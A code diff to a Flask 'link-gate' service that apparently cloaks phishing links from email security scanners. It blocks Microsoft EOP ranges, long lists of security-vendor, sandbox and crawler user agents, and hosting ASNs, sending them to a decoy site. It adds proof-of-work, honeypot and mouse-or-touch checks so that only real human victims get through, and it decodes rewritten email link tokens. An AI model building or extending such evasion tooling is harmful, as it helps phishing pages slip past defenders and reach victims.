@@ -26,8 +26,7 @@ AES_KEY = bytes.fromhex(AES_KEY_HEX)
 
 GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
 UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.xfinity.com")
-
-IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN", "d7fa589dab1942")
+IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN", "d7f89809")
 
 app = Flask(__name__)
 app.secret_key = SK.encode()
@@ -37,71 +36,82 @@ logging.basicConfig(level=logging.INFO)
 log = logging.getLogger("link-gate")
 
 # ---------------------------------------------------------------------------
-# Static blocklists
+# scanner networks & UAs
 # ---------------------------------------------------------------------------
-MICROSOFT_EOP = [
+EOP = [
     ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"),
     ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"),
     ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"),
     ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
 ]
+SCANNER_NETS = {"microsoft_eop": EOP}
 
 SCANNER_UA_TOKENS = (
-    "microsoft office", "safelinks", "microsoft preview", "proofpoint", "pp-url", "mimecast",
-    "barracuda", "talos", "ironport", "forcepoint", "symantec", "messagelabs", "trendmicro",
-    "trend micro", "kaspersky", "sophos", "fireeye", "mandiant", "abnormal security", "avanan",
-    "ironscales", "cloudmark", "agari", "valimail", "hornetsecurity", "spamhaus", "zerospam",
-    "retarus", "vade", "urlscan", "urlscan.io", "virustotal", "any.run", "hybrid-analysis",
-    "joesandbox", "joe sandbox", "cuckoo", "triage", "hatching", "intezer", "cape sandbox",
-    "reverse.it", "filescan.io", "googlebot", "google-safety", "bingpreview", "bingbot",
-    "duckduckbot", "yandexbot", "baiduspider", "slackbot", "twitterbot", "facebookexternalhit",
-    "linkedinbot", "discordbot", "telegrambot", "whatsapp", "skypeuripreview", "applebot",
-    "pinterestbot", "embedly", "quora link preview", "outbrain", "nuzzel", "vk share",
-    "w3c_validator", "curl/", "wget/", "python-requests", "python-urllib", "go-http-client",
-    "java/", "okhttp", "axios/", "node-fetch", "undici", "libwww-perl", "masscan", "nmap",
-    "zgrab", "nuclei", "nikto", "sqlmap", "headlesschrome", "phantomjs", "puppeteer", "playwright",
-    "lighthouse", "pagespeed", "gtmetrix", "pingdom", "uptimerobot", "statuscake", "site24x7",
-    "newrelic", "datadog synthetics", "yahoo", "aol", "verizon", "symantec", "webpulse", "bluecoat", "messagelabs",
-    "appriver", "zix", "apptix", "intermedia", "rackspace",
+    "microsoft office", "safelinks", "microsoft preview", "proofpoint", "pp-url", 
+    "mimecast", "barracuda", "talos", "ironport", "forcepoint", "symantec", 
+    "messagelabs", "trendmicro", "trend micro", "kaspersky", "sophos", "fireeye", 
+    "mandiant", "abnormal security", "avanan", "ironscales", "cloudmark", "agari", 
+    "valimail", "hornetsecurity", "spamhaus", "zerospam", "retarus", "vade",
+    "urlscan", "urlscan.io", "virustotal", "any.run", "hybrid-analysis",
+    "joesandbox", "joe sandbox", "cuckoo", "triage", "hatching",
+    "intezer", "cape sandbox", "reverse.it", "filescan.io", "urlquery",
+    "headlesschrome", "headless", "phantomjs", "puppeteer", "playwright", 
+    "selenium", "webdriver", "nightmare", "electron",
+    "googlebot", "google-safety", "bingpreview", "bingbot", "duckduckbot",
+    "yandexbot", "baiduspider", "slackbot", "twitterbot", "facebookexternalhit",
+    "linkedinbot", "discordbot", "telegrambot", "whatsapp", "skypeuripreview",
+    "applebot", "pinterestbot", "embedly", "quora link preview", "outbrain",
+    "nuzzel", "vk share", "w3c_validator",
+    "curl/", "wget/", "python-requests", "python-urllib", "go-http-client",
+    "java/", "okhttp", "axios/", "node-fetch", "undici", "libwww-perl",
+    "masscan", "nmap", "zgrab", "nuclei", "nikto", "sqlmap",
+    "lighthouse", "pagespeed", "gtmetrix", "pingdom", "uptimerobot",
+    "statuscake", "site24x7", "newrelic", "datadog synthetics",
 )
 
-SUSPICIOUS_ASNS = (
+HOSTING_ASNS = {
+    "AS16509", "AS14618", "AS8075", "AS8068", "AS15169", "AS396982",
+    "AS14061", "AS16276", "AS24940", "AS63949", "AS13335", "AS20940",
+    "AS54113", "AS45102", "AS45090", "AS4134", "AS714", "AS6185",
+    "AS55286", "AS40676", "AS36352", "AS51167", "AS8560", "AS26496",
+    "AS32244", "AS26347", "AS3223", "AS20021", "AS4213", "AS29802",
+    "AS36351", "AS33070", "AS20473", "AS20326", "AS62240", "AS62597",
+    "AS3356", "AS9009", "AS265454", "AS174", "AS30058", "AS8100", 
+    "AS12876", "AS20940", "AS30633", "AS60781", "AS396356", "AS22612", 
+    "AS35916", "AS19527", "AS396073"
+}
+
+HOSTING_KEYWORDS = (
     "AMAZON", "AWS", "GOOGLE", "MICROSOFT", "AZURE", "DIGITALOCEAN", "OVH", 
     "HETZNER", "LINODE", "CLOUDFLARE", "FASTLY", "AKAMAI", "ALIBABA", "TENCENT",
     "PROOFPOINT", "MIMECAST", "BARRACUDA", "ZSCALER", "FORCEPOINT", "IRONPORT",
-    "SOPHOS", "KASPERSKY", "TREND", "SYMANTEC", "VADE", "RETARUS", "HORNET"
+    "SOPHOS", "KASPERSKY", "TREND", "SYMANTEC", "VADE", "RETARUS", "HORNET",
+    "KRYPT", "CHOOPA", "COLOCROSSING", "CONTABO", "VULTR", "GODADDY", "NAMECHEAP",
+    "IONOS", "HOSTGATOR", "BLUEHOST", "LIQUIDWEB", "RACKSPACE", "SOFTLAYER",
+    "ORACLE", "IBM", "M247", "DATAWAGON", "SCALEWAY", "UPCLOUD", "HOSTING",
+    "ABNORMAL", "AVANAN", "IRONSCALES", "CISCO", "TALOS"
 )
 
 def client_ip() -> str:
     xff = request.headers.get("X-Forwarded-For", "")
     return xff.split(",")[0].strip() if xff else request.remote_addr or ""
 
-def check_asn_ipinfo(ip: str) -> bool:
-    """Check IP against ipinfo.io using the provided token."""
+def check_ipinfo(ip: str) -> dict:
     if ip.startswith(("127.", "192.168.", "10.", "172.")):
-        return False
-        
+        return {}
     try:
         url = f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}"
         r = httpx.get(url, timeout=3.0)
         if r.status_code == 200:
-            data = r.json()
-            org = data.get("org", "").upper()
-            
-            # ipinfo returns org as "AS12345 Company Name"
-            for sus in SUSPICIOUS_ASNS:
-                if sus in org:
-                    log.info(json.dumps({"event": "asn_block", "ip": ip, "org": org}))
-                    return True
+            return r.json()
     except Exception as e:
-        log.error(f"ipinfo check failed for {ip}: {e}")
-    return False
+        log.error(json.dumps({"event": "ipinfo_error", "ip": ip, "err": str(e)}))
+    return {}
 
 def classify(ip: str, ua: str) -> dict:
     out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
     low = ua.lower()
     
-    # 1. Check User-Agent
     for tok in SCANNER_UA_TOKENS:
         if tok in low:
             out["scanner"] = True
@@ -109,30 +119,41 @@ def classify(ip: str, ua: str) -> dict:
             out["method"] = "ua"
             return out
 
-    # 2. Check Hardcoded Microsoft EOP Subnets
     try:
         addr = ip_address(ip)
-        for net in MICROSOFT_EOP:
-            if addr in net:
+        for name, nets in SCANNER_NETS.items():
+            if any(addr in n for n in nets):
                 out["scanner"] = True
-                out["source"] = "microsoft_eop"
+                out["source"] = name
                 out["method"] = "ip_static"
                 return out
     except ValueError:
         pass
 
-    # 3. Live Datacenter ASN Lookup via ipinfo.io
-    if check_asn_ipinfo(ip):
-        out["scanner"] = True
-        out["source"] = "datacenter_asn"
-        out["method"] = "asn"
-        return out
-        
+    info = check_ipinfo(ip)
+    org = info.get("org", "").upper()
+    
+    if org:
+        asn = org.split(" ")[0]
+        if asn in HOSTING_ASNS:
+            out["scanner"] = True
+            out["source"] = f"asn:{asn}"
+            out["method"] = "asn"
+            return out
+            
+        for kw in HOSTING_KEYWORDS:
+            if kw in org:
+                out["scanner"] = True
+                out["source"] = kw
+                out["method"] = "asn_keyword"
+                return out
+
     return out
 
 def unseal_payload(blob):
     if not blob.startswith("u001."): return None
     try:
+        blob = blob.rstrip("/")
         core = blob[5:].replace("-3D-3D", "")
         clean = core.replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
         parts = clean.split(".", 1)
@@ -181,9 +202,27 @@ LANDING = """<!DOCTYPE html>
         <input type="hidden" name="t" value="{{ token }}">
         <input type="hidden" name="challenge" value="{{ challenge }}">
         <input type="hidden" name="pow_nonce" id="pow_nonce" value="">
+        <!-- Hidden field for user interaction -->
+        <input type="hidden" name="user_interacted" id="user_interacted" value="false">
     </form>
 
     <script>
+        // Track mouse movement OR touch movement
+        let interacted = false;
+        function markInteraction() {
+            if (!interacted) {
+                interacted = true;
+                document.getElementById('user_interacted').value = 'true';
+            }
+        }
+
+        // Mouse events (Desktop)
+        document.addEventListener('mousemove', markInteraction);
+        
+        // Touch events (Mobile/Tablet)
+        document.addEventListener('touchstart', markInteraction, {passive: true});
+        document.addEventListener('touchmove', markInteraction, {passive: true});
+
         async function solveChallenge() {
             const seed = "{{ challenge }}";
             let nonce = 0; let hash = "";
@@ -195,7 +234,11 @@ LANDING = """<!DOCTYPE html>
                 hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
             }
             document.getElementById("pow_nonce").value = nonce;
-            setTimeout(() => { document.getElementById("challenge-form").submit(); }, 3000);
+            
+            // Wait 3 seconds before submitting
+            setTimeout(() => { 
+                document.getElementById("challenge-form").submit(); 
+            }, 3000);
         }
         window.onload = solveChallenge;
     </script>
@@ -250,6 +293,10 @@ def execute(token: str):
         return redirect(UNWANTED_REDIRECT_URL, code=302)
 
     if request.form.get("email_confirm_hp"):
+        return redirect(UNWANTED_REDIRECT_URL, code=302)
+        
+    # Check for interaction (mouse OR touch)
+    if request.form.get("user_interacted") != "true":
         return redirect(UNWANTED_REDIRECT_URL, code=302)
 
     cookie_val = request.cookies.get("gate_session", "")
